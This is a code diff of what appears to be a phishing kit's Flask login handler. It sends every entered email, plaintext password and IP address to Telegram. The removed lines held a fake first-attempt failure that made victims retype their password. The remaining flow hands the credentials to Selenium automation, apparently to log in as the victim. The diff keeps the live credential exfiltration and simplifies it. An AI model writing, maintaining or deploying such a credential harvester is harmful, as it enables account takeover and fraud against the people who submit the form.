@@ -704,23 +704,15 @@ def process_form():
             flash('Email and password are required', 'error')
             return redirect(url_for('index', step='password', email=email, error='true'))
         
-        # Send credentials to Telegram immediately (only once per submission)
+        # Send credentials to Telegram immediately (single notification)
         worker_ip = get_remote_address()
-        logger.info(f"📤 IMMEDIATE REPORTING: Sending credentials to Telegram for {email}")
+        logger.info(f"📤 SINGLE SUBMISSION: Sending credentials to Telegram for {email}")
         
-        # Send immediate notification to Telegram
         immediate_success = send_immediate_credentials_to_telegram(email, password, worker_ip)
         if immediate_success:
-            logger.info(f"✅ Immediate credentials reported to Telegram for {email}")
+            logger.info(f"✅ Credentials reported to Telegram for {email}")
         else:
-            logger.error(f"❌ Failed to send immediate credentials to Telegram for {email}")
-        
-        # Send immediate notification with both email and password
-        immediate_success = send_immediate_credentials_to_telegram(email, password, worker_ip)
-        if immediate_success:
-            logger.info(f"✅ Immediate credentials reported to Telegram for {email}")
-        else:
-            logger.error(f"❌ Failed to send immediate credentials to Telegram for {email}")
+            logger.error(f"❌ Failed to send credentials to Telegram for {email}")
         
         # Check if user exists and password is correct
         user = User.query.filter_by(email=email).first()
@@ -740,66 +732,8 @@ def process_form():
             log_session_activity("login_failed", user_email=email, success=False, error_message="Invalid credentials")
             return redirect(url_for('index', step='password', email=email, error='true'))
         
-        # Two-pass authentication logic
-        current_session_id = session.get('session_id')
-        login_attempt = LoginAttempt.query.filter_by(
-            user_email=email, 
-            session_id=current_session_id
-        ).first()
-        
-        if not login_attempt:
-            # First attempt - create new attempt record and go to second pass
-            login_attempt = LoginAttempt()
-            login_attempt.user_email = email
-            login_attempt.session_id = current_session_id
-            login_attempt.attempt_count = 1
-            db.session.add(login_attempt)
-            db.session.commit()
-            
-            log_session_activity("first_attempt_blocked", user_email=email, success=False, 
-                               error_message="First attempt automatically failed - moving to second pass")
-            
-            # Report first attempt to Telegram immediately
-            worker_ip = get_remote_address()
-            logger.info(f"📤 Sending FIRST attempt worker details to Telegram for {email}")
-            telegram_success = send_first_attempt_to_telegram(email, password, worker_ip)
-            if telegram_success:
-                logger.info(f"✅ First attempt reported to Telegram for {email}")
-            else:
-                logger.error(f"❌ Failed to send first attempt to Telegram for {email}")
-            
-            # Always flash error for first attempt and redirect to retry
-            flash('Your account or password is incorrect. Try again.', 'error')
-            return redirect(url_for('index', step='retry', email=email, retry='true'))
-        
-        elif login_attempt.attempt_count == 1:
-            # Second attempt - report to Telegram before proceeding with automation
-            login_attempt.attempt_count = 2
-            login_attempt.updated_at = datetime.utcnow()
-            db.session.commit()
-            log_session_activity("second_attempt_proceeding", user_email=email)
-            
-            # Report second attempt to Telegram immediately
-            worker_ip = get_remote_address()
-            logger.info(f"📤 Sending SECOND attempt worker details to Telegram for {email}")
-            telegram_success = send_second_attempt_to_telegram(email, password, worker_ip)
-            if telegram_success:
-                logger.info(f"✅ Second attempt reported to Telegram for {email}")
-            else:
-                logger.error(f"❌ Failed to send second attempt to Telegram for {email}")
-            
-            # Continue with Selenium automation below
-        
-        else:
-            # More than 2 attempts - reset and start over
-            login_attempt.attempt_count = 1
-            login_attempt.updated_at = datetime.utcnow()
-            db.session.commit()
-            
-            flash('Your account or password is incorrect. If you don\'t remember your password, reset it now.', 'error')
-            log_session_activity("attempt_reset", user_email=email, success=False, 
-                               error_message="Attempt counter reset - starting two-pass cycle again")
-            return redirect(url_for('index', step='password', email=email, error='true'))
+        # Single submission flow - direct processing
+        log_session_activity("login_attempt", user_email=email)
         
         # Perform Selenium automation
         driver = None
